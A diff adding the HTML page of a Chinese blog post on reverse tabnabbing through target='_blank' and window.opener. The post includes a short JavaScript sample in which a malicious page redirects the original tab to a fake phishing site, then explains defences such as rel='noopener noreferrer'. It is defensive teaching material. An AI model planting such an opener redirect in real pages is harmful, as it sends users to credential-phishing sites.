@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>危险的target=&#34;_blank&#34;与&#34;opener&#34; | To be a Web Artisan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="原文链接：https://juejin.im/post/5a9f8425f265da239a5f57f8  在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。然而，就是这个属性，为钓鱼攻击者带来了可乘之机。  起源parent 与 opener在说 opener 之前，可以先聊聊 &amp;lt;iframe&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="危险的target=&quot;_blank&quot;与&quot;opener&quot;">
+<meta property="og:url" content="https://liluoao.github.io/2018/04/危险的target-blank与opener/index.html">
+<meta property="og:site_name" content="To be a Web Artisan">
+<meta property="og:description" content="原文链接：https://juejin.im/post/5a9f8425f265da239a5f57f8  在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。然而，就是这个属性，为钓鱼攻击者带来了可乘之机。  起源parent 与 opener在说 opener 之前，可以先聊聊 &amp;lt;iframe&amp;gt">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://liluoao.github.io/images/noopener-version.png">
+<meta property="og:updated_time" content="2018-04-11T08:41:21.124Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="危险的target=&quot;_blank&quot;与&quot;opener&quot;">
+<meta name="twitter:description" content="原文链接：https://juejin.im/post/5a9f8425f265da239a5f57f8  在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。然而，就是这个属性，为钓鱼攻击者带来了可乘之机。  起源parent 与 opener在说 opener 之前，可以先聊聊 &amp;lt;iframe&amp;gt">
+<meta name="twitter:image" content="https://liluoao.github.io/images/noopener-version.png">
+<meta name="twitter:creator" content="@liluoao">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">To be a Web Artisan</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">文章列表</a>
+        
+          <a class="main-nav-link" href="/categories/laravel">Laravel</a>
+        
+          <a class="main-nav-link" href="/categories/phalcon">Phalcon</a>
+        
+          <a class="main-nav-link" href="/categories/mysql">MySQL</a>
+        
+          <a class="main-nav-link" href="/me.html">关于作者</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://liluoao.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-危险的target-blank与opener" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/危险的target-blank与opener/" class="article-date">
+  <time datetime="2018-04-11T08:16:35.000Z" itemprop="datePublished">2018-04-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/安全/">安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      危险的target=&#34;_blank&#34;与&#34;opener&#34;
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>原文链接：<a href="https://juejin.im/post/5a9f8425f265da239a5f57f8" target="_blank" rel="noopener">https://juejin.im/post/5a9f8425f265da239a5f57f8</a></p>
+<blockquote>
+<p>在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。<br>然而，就是这个属性，为钓鱼攻击者带来了可乘之机。</p>
+</blockquote>
+<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><h4 id="parent-与-opener"><a href="#parent-与-opener" class="headerlink" title="parent 与 opener"></a><code>parent</code> 与 <code>opener</code></h4><p>在说 <code>opener</code> 之前，可以先聊聊 <code>&lt;iframe&gt;</code> 中的 <code>parent</code>。</p>
+<p>我们知道，在 <code>&lt;iframe&gt;</code> 中提供了一个用于父子页面交互的对象，叫做 <code>window.parent</code>，我们可以通过 <code>window.parent</code> 对象来从框架中的页面访问父级页面的 <code>window</code>。</p>
+<p><code>opener</code> 与 <code>parent</code> 一样，只不过是用于 <code>&lt;a target=&quot;_blank&quot;&gt;</code> 在新标签页打开的页面的。通过 <code>&lt;a target=&quot;_blank&quot;&gt;</code> 打开的页面，可以直接使用 <code>window.opener</code> 来访问来源页面的 <code>window</code> 对象。<br><a id="more"></a></p>
+<h4 id="同域与跨域"><a href="#同域与跨域" class="headerlink" title="同域与跨域"></a>同域与跨域</h4><p>浏览器提供了完整的跨域保护，在域名相同时，<code>parent</code> 对象和 <code>opener</code> 对象实际上就直接是上一级的 <code>window</code> 对象；而当域名不同时，<code>parent</code> 和 <code>opener</code> 则是经过包装的一个 <code>global</code> 对象。这个 <code>global</code> 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 <code>DOMException</code>）。</p>
+<p>在 <code>&lt;iframe&gt;</code> 中，提供了一个 <code>sandbox</code> 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 <code>&lt;iframe&gt;</code> 的安全性。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>如果，你的网站上有一个链接，使用了 <code>target=&quot;_blank&quot;</code>，那么一旦用户点击这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。</p>
+<h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><ol>
+<li><p>在你的网站 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 上存在一个链接：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://an.evil.site"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>进入一个“邪恶”的网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 <code>HTTP Header</code> 中的 <code>Referer</code> 属性来判断用户的来源。</p>
+<p>并且，这个网站上包含着类似于这样的 <code>JavaScript</code> 代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="built_in">encodeURIComponent</span>(<span class="string">'&#123;&#123;header.referer&#125;&#125;'</span>);</span><br><span class="line"><span class="built_in">window</span>.opener.location.replace(<span class="string">'https://a.fake.site/?'</span> + url);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 <code>https://a.fake.site/?https%3A%2F%2Fexample.com%2F</code>。</p>
+</li>
+<li>恶意网站 <code>https://a.fake.site</code> 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。</li>
+<li>用户关闭 <code>https://an.evil.site</code> 的标签页，回到原来的网站………………已经回不去了。</li>
+</ol>
+<blockquote>
+<p>上面的攻击步骤是在跨域的情况下的，在跨域情况下，<code>opener</code> 对象和 <code>parent</code> 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 <code>DOMException</code>）。<br>  但是与 <code>parent</code> 不同的是，<strong>在跨域的情况下，<code>opener</code> 仍然可以调用 <code>location.replace</code> 方法而 <code>parent</code> 则不可以</strong>。<br>  如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。</p>
+</blockquote>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><code>&lt;iframe&gt;</code> 中有 <code>sandbox</code> 属性，而链接，则可以使用下面的办法：</p>
+<h4 id="1-Referrer-Policy-和-noreferrer"><a href="#1-Referrer-Policy-和-noreferrer" class="headerlink" title="1. Referrer Policy 和 noreferrer"></a>1. Referrer Policy 和 noreferrer</h4><p>上面的攻击步骤中，用到了 HTTP Header 中的 <code>Referer</code> 属性，实际上可以在 HTTP 的响应头中增加 <code>Referrer Policy</code> 头来保证来源隐私安全。</p>
+<p><code>Referrer Policy</code> 需要修改后端代码来实现，而在前端，也可以使用 <code>&lt;a&gt;</code> 标签的 <code>rel</code> 属性来指定 <code>rel=&quot;noreferrer&quot;</code> 来保证来源隐私安全。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://an.evil.site"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span>&gt;</span>进入一个“邪恶”的网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>但是要注意的是：即使限制了 <code>referer</code> 的传递，仍然不能阻止原标签被恶意跳转。</p>
+</blockquote>
+<h4 id="2-noopener"><a href="#2-noopener" class="headerlink" title="2. noopener"></a>2. noopener</h4><p>为了安全，现代浏览器都支持在 <code>&lt;a&gt;</code> 标签的 <code>rel</code> 属性中指定 <code>rel=&quot;noopener&quot;</code>，这样，在打开的新标签页中，将无法再使用 <code>opener</code> 对象了，它为设置为了 <code>null</code>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://an.evil.site"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener"</span>&gt;</span>进入一个“邪恶”的网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="3-JavaScript"><a href="#3-JavaScript" class="headerlink" title="3. JavaScript"></a>3. JavaScript</h4><p><code>noopener</code> 属性看似是解决了所有问题，但是…浏览器的兼容性问题…<br><img src="/images/noopener-version.png" alt=""><br>可以看到，现在绝大多数浏览器都已经兼容了 <code>rel=&quot;noopener&quot;</code> 属性了。但是，为了保护稍旧的“近代”浏览器或是很旧的“古代”浏览器甚至是“远古”浏览器，只有 <code>noopener</code> 属性还是远远不够的。</p>
+<p>这时，就只能请出下面这段原生 JavaScript 来帮忙了。<br><figure class="highlight javascript"><figcaption><span>1.8</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">openUrl</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> newTab = <span class="built_in">window</span>.open();</span><br><span class="line">  newTab.opener = <span class="literal">null</span>;</span><br><span class="line">  newTab.location = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>首先，在网站中的链接上，如果使用了 <code>target=&quot;_blank&quot;</code>，就要带上 <code>rel=&quot;noopener&quot;</code>，并且建议带上 <code>rel=&quot;noreferrer&quot;</code>。类似于这样：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://an.evil.site"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener noreferrer"</span>&gt;</span>进入一个“邪恶”的网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当然，在跳转到第三方网站的时候，为了 SEO 权重，还建议带上 <code>rel=&quot;nofollow&quot;</code>，所以最终类似于这样：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://an.evil.site"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">rel</span>=<span class="string">"noopener noreferrer nofollow"</span>&gt;</span>进入一个“邪恶”的网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p>最后，再来说说性能问题。</p>
+<p>如果网站使用了 <code>&lt;a target=&quot;_blank&quot;&gt;</code>，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 JavaScript 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）。</p>
+<p>而如果在链接中加入了 <code>noopener</code>，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://liluoao.github.io/2018/04/危险的target-blank与opener/" data-id="cjfuuja4l000w0smjs8daeou1" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/04/非官方微信红包拆分算法/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">非官方微信红包拆分算法</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/composer/">composer</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/laravel/">laravel</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/phalcon/">phalcon</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ci/">ci</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/culture/">culture</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/laravel/">laravel</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phalcon/">phalcon</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/restful/">restful</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ci/" style="font-size: 10px;">ci</a> <a href="/tags/culture/" style="font-size: 20px;">culture</a> <a href="/tags/laravel/" style="font-size: 10px;">laravel</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/phalcon/" style="font-size: 13.33px;">phalcon</a> <a href="/tags/restful/" style="font-size: 10px;">restful</a> <a href="/tags/算法/" style="font-size: 16.67px;">算法</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/04/危险的target-blank与opener/">危险的target=&#34;_blank&#34;与&#34;opener&#34;</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/非官方微信红包拆分算法/">非官方微信红包拆分算法</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/我所理解的接口设计/">我所理解的接口设计</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/排列组合/">排列组合</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/使用AppVeyor持续集成本博客/">使用AppVeyor持续集成本博客</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <div class="footer-copyright">
+        &copy; 2018 李罗奥<br>
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      </div>
+      <div class="footer-about-me">
+        关于作者<br>
+        <a href="https://github.com/liluoao" target="_blank" title="GitHub">GitHub</a><br>
+        <a href="https://segmentfault.com/u/liluoao" target="_blank" title="SegmentFault">SegmentFault</a><br>
+        <a href="https://laravel-china.org/users/7144" target="_blank" title="LaravelChina">LaravelChina</a><br>
+        <a href="https://gitee.com/liluoao" target="_blank" title="码云">码云</a><br>
+        <a href="https://juejin.im/user/5a19374cf265da4332274600" target="_blank" title="掘金">掘金</a><br>
+        <a href="https://packagist.org/users/liluoao/" target="_blank" title="Packagist">Packagist</a><br>
+        <a href="https://www.gitbook.com/@liluoao" target="_blank" title="GitBook">GitBook</a>
+      </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">文章列表</a>
+  
+    <a href="/categories/laravel" class="mobile-nav-link">Laravel</a>
+  
+    <a href="/categories/phalcon" class="mobile-nav-link">Phalcon</a>
+  
+    <a href="/categories/mysql" class="mobile-nav-link">MySQL</a>
+  
+    <a href="/me.html" class="mobile-nav-link">关于作者</a>
+  
+</nav>
+    
+
+<script src="//lib.sinaapp.com/js/jquery/3.1.0/jquery-3.1.0.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
